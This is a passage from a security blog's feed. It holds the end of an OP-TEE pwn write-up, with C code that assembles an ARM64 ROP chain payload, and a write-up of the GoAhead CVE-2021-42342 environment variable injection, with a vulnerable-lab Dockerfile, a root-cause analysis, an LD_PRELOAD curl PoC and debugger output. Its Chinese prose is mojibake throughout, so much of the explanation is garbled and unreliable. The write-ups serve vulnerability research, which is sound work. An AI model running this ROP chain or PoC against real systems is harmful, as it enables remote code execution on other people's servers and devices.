class="keyword">uint64_t</span>*)(payload+<span class="number">184</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000C40</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">344</span>) = x2; <span class="comment">//next x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x2 = [SP,#0x70+va]</span></span><br><span class="line"><span class="comment">//0x0000000000000C40 E2 37 40 F9                                   LDR             X2, [SP,#0x70+va]</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>+<span class="number">0x38</span>) = <span class="number">0x40015150</span>; <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">272</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">304</span>) = <span class="number">0</span>; <span class="comment">//next x25</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">160</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>+<span class="number">8</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x0 = [x19 + 0x18]</span></span><br><span class="line"><span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line"><span class="comment">//*(uint64_t*)(payload+360) = 0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">432</span>) = x1; <span class="comment">//next x27</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">440</span>) = x3; <span class="comment">//next x28</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">360</span>) = g_ta_addr+<span class="number">0x000000000000aa00</span>;<span class="comment">//next pc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x3 == x28  x1 == x27</span></span><br><span class="line"><span class="comment">//0x000000000000aa00 : mov x3, x28 ; csel x21, x21, x2, ne ; mov x1, x27 ; mov x2, x21 ; str x24, [sp, #0x78] ; blr x23</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">400</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000001f98</span>;<span class="comment">//next x23 next pc</span></span><br><span class="line"><span class="comment">//x21 == [sp, #0x20]</span></span><br><span class="line"><span class="comment">//0x0000000000001f98 : ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">376</span>) = <span class="number">0x40015170</span>; <span class="comment">//next x20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">496</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">472</span>) = g_ta_addr + <span class="number">0x0000000000005fa4</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">696</span>) = x4; <span class="comment">//next x4 == [x20, #8]</span></span><br><span class="line"><span class="comment">//x4 == [x20, #8]</span></span><br><span class="line"><span class="comment">//x1 == [x21, #8]</span></span><br><span class="line"><span class="comment">//0x0000000000005fa4 : ldr x4, [x20, #8] ; ldr x0, [x21, #8] ; cmp x4, x0 ; b.hi #0x5fc8 ; mov w0, w9 ; ldp x19, x20, [sp, #0x10] ; ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">528</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">544</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">416</span>) = <span class="number">0xFFFFFFFFFFFFF001</span>; <span class="comment">//next x25</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">520</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">728</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">568</span>) = func;<span class="comment">//0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.daimajiaoliu.com/daima/4872449c3100404">OP-TEEä¸­secure stroageâ€”â€”å®‰å…¨å­˜å‚¨ä½¿ç”¨çš„keyçš„äº§ç”Ÿ (daimajiaoliu.com)</a></p><p><a href="https://optee.readthedocs.io/en/latest/">OP-TEE Documentation â€” OP-TEE documentation documentation (optee.readthedocs.io)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-42342 Goahead ç¯å¢ƒå˜é‡æ³¨å…¥æ¼æ´åˆ†æ</title>
    <link href="https://bestwing.me/CVE-2021-42342-Goahead.html"/>
    <id>https://bestwing.me/CVE-2021-42342-Goahead.html</id>
    <published>2022-01-09T16:00:00.000Z</published>
    <updated>2022-04-02T15:05:14.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="æ¼æ´èƒŒæ™¯"><a href="#æ¼æ´èƒŒæ™¯" class="headerlink" title="æ¼æ´èƒŒæ™¯"></a>æ¼æ´èƒŒæ™¯</h2><p>è¿‘æ—¥çˆ†å‡ºGoAheadå­˜åœ¨RCEæ¼æ´ï¼ˆå®é™…æ¥æºäº PBCTF çš„ä¸€é“é¢˜ç›®ï¼‰ï¼Œæ¼æ´æºäºæ–‡ä»¶ä¸Šä¼ è¿‡æ»¤å™¨çš„å¤„ç†ç¼ºé™·ï¼Œå½“ä¸CGIå¤„ç†ç¨‹åºä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå¯å½±å“ç¯å¢ƒå˜é‡ï¼Œä»è€Œå¯¼è‡´RCEã€‚æ¼æ´å½±å“ç‰ˆæœ¬ä¸ºï¼š</p><ul><li>GoAhead =4.x</li><li>5.x&lt;=GoAhead&lt;5.1.5</li></ul><p>æˆ‘ä¸ºå•¥çœ‹è¿™ä¸ªæ¼æ´å‘¢ï¼Ÿæ˜¯å› ä¸º phith0n å¸ˆå‚…å‘äº†ä¸€ç¯‡å¤ç°è¸©å‘è®°ï¼Œ æˆ‘å¯¹å…¶ä¸­ä¸€å— æ–‡ä»¶æè¿°ç¬¦æ‰¾ä¸åˆ°çš„è§£å†³è¿‡ç¨‹æ¯”è¾ƒæ„Ÿå…´è¶£ã€‚äºæ˜¯å’Œ @leommxj ä¸€èµ·çœ‹äº†ä¸‹ã€‚ç„¶åç®€å•è®°å½•äº†ä¸‹è¿™äº›è¿‡ç¨‹ï¼Œæ¯”è¾ƒç®€ç•¥ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>å‚è€ƒ phith0n çš„æ–‡ç« ï¼š <a href="https://tttang.com/archive/1399/">GoAheadç¯å¢ƒå˜é‡æ³¨å…¥å¤ç°è¸©å‘è®° - è·³è·³ç³– (tttang.com)</a></p><p>Dockerfile å¦‚ä¸‹</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> beswing/swpwn:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">set</span> -ex \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get install wget make gcc -y \</span></span><br><span class="line"><span class="bash">    &amp;&amp; wget -qO- https://github.com/embedthis/goahead/archive/refs/tags/v5.1.4.tar.gz | tar zx --strip-components 1 -C /usr/src/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">cd</span> /usr/src \</span></span><br><span class="line"><span class="bash">    &amp;&amp; make SHOW=1 ME_GOAHEAD_UPLOAD_DIR=<span class="string">&quot;&#x27;\&quot;/tmp\&quot;&#x27;&quot;</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; make install \</span></span><br><span class="line"><span class="bash">    &amp;&amp; cp src/self.key src/self.crt /etc/goahead/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; mkdir -p /var/www/goahead/cgi-bin/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get purge -y --auto-remove wget make gcc \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">cd</span> /var/www/goahead \</span></span><br><span class="line"><span class="bash">    &amp;&amp; sed -e <span class="string">&#x27;s!^# route uri=/cgi-bin dir=cgi-bin handler=cgi$!route uri=/cgi-bin dir=/var/www/goahead handler=cgi!&#x27;</span> -i /etc/goahead/route.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;goahead&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--home&quot;</span>, <span class="string">&quot;/etc/goahead&quot;</span>, <span class="string">&quot;/var/www/goahead&quot;</span>]</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´çš„ç¬¬ä¸€ä¸ªå‘ï¼š<strong>æ–°ç‰ˆæœ¬çš„GoAheadé»˜è®¤æ²¡æœ‰å¼€å¯CGIé…ç½®ï¼Œè€Œè€ç‰ˆæœ¬å¦‚æœæ²¡æœ‰cgi-binç›®å½•ï¼Œæˆ–è€…é‡Œé¢æ²¡æœ‰cgiæ–‡ä»¶ï¼Œä¹Ÿä¸å—è¿™ä¸ªæ¼æ´å½±å“ã€‚</strong>æ‰€ä»¥å¹¶ä¸åƒæŸäº›æ–‡ç« é‡Œè¯´çš„é‚£æ ·å½±å“å¹¿æ³›ã€‚</p></blockquote><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><h4 id="HTTP-è¯·æ±‚æµç¨‹"><a href="#HTTP-è¯·æ±‚æµç¨‹" class="headerlink" title="HTTP è¯·æ±‚æµç¨‹"></a>HTTP è¯·æ±‚æµç¨‹</h4><p>è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#1  0x00007f44624fc11d in cgiHandler (wp&#x3D;0x55e66c994790) at src&#x2F;cgi.c:216</span><br><span class="line">#2  0x00007f446250e44b in websRunRequest (wp&#x3D;0x55e66c994790) at src&#x2F;route.c:182</span><br><span class="line">#3  0x00007f446250152c in websPump (wp&#x3D;0x55e66c994790) at src&#x2F;http.c:870</span><br><span class="line">#4  0x00007f44625013b9 in readEvent (wp&#x3D;0x55e66c994790) at src&#x2F;http.c:834</span><br><span class="line">#5  0x00007f4462501142 in socketEvent (sid&#x3D;2, mask&#x3D;2, wptr&#x3D;0x55e66c994790) at src&#x2F;http.c:772</span><br><span class="line">#6  0x00007f4462516dbf in socketDoEvent (sp&#x3D;0x55e66c994650) at src&#x2F;socket.c:654</span><br><span class="line">#7  0x00007f4462516ce5 in socketProcess () at src&#x2F;socket.c:628</span><br><span class="line">#8  0x00007f4462502f34 in websServiceEvents (finished&#x3D;0x55e66aa02014 &lt;finished&gt;) at src&#x2F;http.c:1385</span><br><span class="line">#9  0x000055e66a8005cf in main (argc&#x3D;5, argv&#x3D;0x7fff507b50c8, envp&#x3D;0x7fff507b50f8) at src&#x2F;goahead.c:170</span><br></pre></td></tr></table></figure><p>æ•´ä¸ª<code>goahead</code>å¤„ç†<code>cgi</code>æ‰€å¯¹åº”<code>post</code>è¯·æ±‚å¤„ç†æµç¨‹å°ç»“å¦‚ä¸‹ï¼š</p><ol><li><p>è°ƒç”¨<code>websRead</code>å‡½æ•°ï¼Œæ‰€æœ‰æ•°æ®ä¿å­˜åˆ°äº†wp-&gt;rxbufä¸­ã€‚</p></li><li><p>è°ƒç”¨</p><p><code>websPump</code></p><p>ï¼Œè¯¥å‡½æ•°åŒ…å«ä¸‰éƒ¨åˆ†ï¼š</p><ol><li>è°ƒç”¨<code>parseIncoming</code>å‡½æ•°è§£æè¯·æ±‚å¤´ä»¥åŠè°ƒç”¨<code>websRouteRequest</code>ç¡®å®šç›¸åº”çš„å¤„ç†å‡½æ•°ã€‚</li><li>è°ƒç”¨<code>processContent</code>å°†å¤„ç†postæ•°æ®ï¼Œå°†å…¶ä¿å­˜åˆ°tmpæ–‡ä»¶ä¸­ã€‚</li><li>è°ƒç”¨<code>websRunRequest</code>å‡½æ•°ï¼Œè°ƒç”¨ç›¸åº”çš„å¤„ç†å‡½æ•°ï¼Œcgiå¯¹åº”ä¸º<code>cgiHandler</code>ã€‚</li></ol></li><li><p>è°ƒç”¨<code>cgiHandler</code>ï¼Œå°†è¯·æ±‚å¤´ä»¥åŠgetå‚æ•°è®¾ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œè°ƒç”¨<code>launchCgi</code>å‡½æ•°ã€‚</p></li><li><p>è°ƒç”¨<code>launchCgi</code>å‡½æ•°ï¼Œå°†æ ‡å‡†è¾“å‡ºè¾“å…¥é‡å®šå‘åˆ°æ–‡ä»¶å¥æŸ„ï¼Œè°ƒç”¨<code>execve</code>å¯åŠ¨cgiè¿›ç¨‹ã€‚</p></li></ol><h4 id="æ ¹æœ¬åŸå› ï¼ˆRoot-causeï¼‰"><a href="#æ ¹æœ¬åŸå› ï¼ˆRoot-causeï¼‰" class="headerlink" title="æ ¹æœ¬åŸå› ï¼ˆRoot causeï¼‰"></a>æ ¹æœ¬åŸå› ï¼ˆRoot causeï¼‰</h4><ol><li><code>strim</code> å‡½æ•°çš„é”™è¯¯ä½¿ç”¨</li></ol><p>strim å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PUBLIC <span class="keyword">char</span> *<span class="title">strim</span><span class="params">(<span class="keyword">char</span> *str, cchar *<span class="built_in">set</span>, <span class="keyword">int</span> where)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>    *s;</span><br><span class="line">    ssize   len, i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str == <span class="number">0</span> || <span class="built_in">set</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    s = (<span class="keyword">char</span>*) &amp;str[i];</span><br><span class="line">    <span class="keyword">if</span> (where &amp; WEBS_TRIM_END) &#123;</span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç¬¬äºŒä¸ªå‚æ•°ä¸º 0 çš„æ—¶å€™ï¼Œ ç›´æ¥è¿”å› 0 ã€‚ç„¶è€Œ goahead çš„ cgi.c:176 è¡Œä»£ç æ˜¯è¿™æ ·ä½¿ç”¨çš„</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201101526090.png" title="image-20220110152602890" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201101526090.png" alt="image-20220110152602890"></a></p><p>é‚£ä¹ˆæ­¤å¤„ vp çš„ å€¼ä¸º 0 ï¼Œ å› æ­¤åç»­çš„ smatch åˆ¤æ–­éƒ½æ¯«æ— æ„ä¹‰ã€‚ å¦å¤–æˆ‘ä»¬æ³¨æ„åˆ° 182 å’Œ 186 è¡Œéƒ½æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œ ç„¶è€Œ 183 è¡Œå¤„ä¼šæ‹¼æ¥ <code>CGI_</code> åˆ°å­—ç¬¦ï¼Œ å› æ­¤ä¸æ˜¯æˆ‘ä»¬æ¼æ´åˆ©ç”¨çš„ç›®æ ‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ME_GOAHEAD_CGI_VAR_PREFIX <span class="meta-string">&quot;CGI_&quot;</span></span></span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦èµ°åˆ° 186 è¡Œä»£ç ï¼Œéœ€è¦ <code>s-&gt;arg</code> ä¸º 0 å³å¯ï¼ˆåˆå§‹åŒ–çŠ¶æ€ä¸º<code>0</code>ï¼‰</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>éœ€è¦åœ¨Bodyä¸­å‘é€multipartè¡¨å•ï¼Œç„¶ååœ¨åŠ«æŒç¯å¢ƒå˜é‡ã€‚ PoC å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -F data=@poc.so -F <span class="string">&quot;LD_PRELOAD=/proc/self/fd/7&quot;</span> http://127.0.0.1:8080/cgi-bin/test.cgi\n</span><br></pre></td></tr></table></figure><h3 id="æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦"><a href="#æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦"></a>æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦</h3><p>åœ¨ä½¿ç”¨å¦‚ä¸Š Dockerfile ä½œä¸ºç¯å¢ƒçš„æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œä¼šå‘ç°åŠ«æŒ so çš„è¿‡ç¨‹ä¼šæœ‰å¦‚ä¸‹æŠ¥é”™</p><ul><li><code>ERROR: ld.so: object &#39;/proc/self/fd/7&#39; from LD_PRELOAD cannot be preloaded (file too short): ignored.</code></li><li><code>ERROR: ld.so: object &#39;/proc/self/fd/5&#39; from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.</code></li><li><code>ERROR: ld.so: object &#39;/proc/self/fd/2&#39; from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.</code></li></ul><p>ç»è¿‡è°ƒè¯•å’Œä»£ç é˜…è¯»åˆ†æäº†ï¼Œå¤§è‡´åŸå› å¦‚ä¸‹ï¼š</p><p>å½“æœ€åä¸€ä¸ªåŒ…è¢«å¤„ç†çš„æ—¶å€™ï¼Œå³è¿›åˆ° <code>upload.c#processContentData</code> å‡½æ•°ä¸­</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091727107.png" title="image-20220109172745897" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091727107.png" alt="image-20220109172745897"></a></p><p>å³ 334 è¡Œä»£ç å¤„ï¼Œè¿›å…¥åˆ° <code>get</code> å‡½æ•°ä¸­ï¼Œæ­¤å‡½æ•°é€»è¾‘ä¸ºåˆ¤æ–­æ˜¯å¦è¯»åˆ° upload æ•°æ®çš„ç»“æŸç¬¦å·ï¼Œå³ <code>boundary </code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: &#x2F;usr&#x2F;src&#x2F;src&#x2F;upload.c</span><br><span class="line">   419     while (cp &lt; endp) &#123;</span><br><span class="line">   420         cp &#x3D; (char *) memchr(cp, first, endp - cp);</span><br><span class="line">   421         if (!cp) &#123;</span><br><span class="line">   422             return 0;</span><br><span class="line">   423         &#125;</span><br><span class="line"> â–º 424         if (memcmp(cp, wp-&gt;boundary, wp-&gt;boundaryLen) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">   425             return cp;</span><br><span class="line">   426         &#125;</span><br><span class="line">   427         cp++;</span><br><span class="line">   428     &#125;</span><br><span class="line">   429     return 0;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp 0x7ffcd8eca3e0 â€”â–¸ 0x7ffcd8eca410 â€”â–¸ 0x5590f9adce48 â—‚â€” &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">01:0008â”‚     0x7ffcd8eca3e8 â—‚â€” 0x2f &#x2F;* &#39;&#x2F;&#39; *&#x2F;</span><br><span class="line">02:0010â”‚     0x7ffcd8eca3f0 â€”â–¸ 0x5590f9adce3f â—‚â€” &#39;aaaaaa\n\r\n--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">03:0018â”‚     0x7ffcd8eca3f8 â€”â–¸ 0x5590f9adb790 â€”â–¸ 0x5590f9add5d0 â—‚â€” 0x67632f0054534f00</span><br><span class="line">04:0020â”‚     0x7ffcd8eca400 â€”â–¸ 0x7ffcd8eca410 â€”â–¸ 0x5590f9adce48 â—‚â€” &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">05:0028â”‚     0x7ffcd8eca408 â—‚â€” 0x2d005590f9adfd70</span><br><span class="line">06:0030â”‚     0x7ffcd8eca410 â€”â–¸ 0x5590f9adce48 â—‚â€” &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">07:0038â”‚     0x7ffcd8eca418 â€”â–¸ 0x5590f9adce4d â—‚â€” &#39;4f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f 0   0x7fb0335a7429 getBoundary+206</span><br><span class="line">   f 1   0x7fb0335a7003 processContentData+109</span><br><span class="line">   f 2   0x7fb0335a66f7 websProcessUploadData+372</span><br><span class="line">   f 3   0x7fb03358f7d4 processContent+110</span><br><span class="line">   f 4   0x7fb03358e51b websPump+104</span><br><span class="line">   f 5   0x7fb03358e3b9 readEvent+352</span><br><span class="line">   f 6   0x7fb03358e142 socketEvent+159</span><br><span class="line">   f 7   0x7fb0335a3dbf socketDoEvent+197</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p cp</span><br><span class="line">$15 &#x3D; 0x5590f9adce48 &quot;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&quot;</span><br><span class="line">pwndbg&gt; p wp-&gt;boundary</span><br><span class="line">$16 &#x3D; 0x5590f9ad5a70 &quot;--1544f720d6ce5bdc5b81100af0acc3b5&quot;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯åˆ™è¿”å› <code>cp</code>, å› æ­¤ï¼Œå½“æ­£å¸¸çš„æ•°æ®åŒ…çš„æ—¶å€™ï¼Œæ­¤æ—¶ 334 è¡Œçš„åˆ¤æ–­ä¸æˆç«‹ï¼Œä»£ç ä¼šå¾€ä¸‹èµ°ï¼Œæœ€åèµ°åˆ° 391 ä»£ç ï¼Œclose è°ƒä¸´æ—¶æ–‡ä»¶çš„ fdï¼Œ å› æ­¤åŒ…å«çš„æ—¶å€™ä¼šæŠ¥é”™ã€‚</p><p>é‚£ä¹ˆæ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ phith0n å¸ˆå‚…æ–‡ç« ä¸­çš„è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><blockquote><p>é¦–å…ˆæ„é€ å¥½ä¹‹å‰é‚£ä¸ªæ— æ³•åˆ©ç”¨çš„æ•°æ®åŒ…ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªè¡¨å•å­—æ®µæ˜¯<code>LD_PRELOAD</code>ï¼Œå€¼æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œä¸€èˆ¬æ˜¯<code>/proc/self/fd/7</code>ã€‚ç„¶åæˆ‘ä»¬éœ€è¦æ”¹é€ è¿™ä¸ªæ•°æ®åŒ…ï¼š</p><ul><li>ç»™payload.soæ–‡ä»¶æœ«å°¾å¢åŠ å‡ åƒä¸ªå­—èŠ‚çš„è„å­—ç¬¦ï¼Œæ¯”å¦‚è¯´<code>a</code></li><li>å…³æ‰burpsuiteè‡ªåŠ¨çš„â€œUpdate 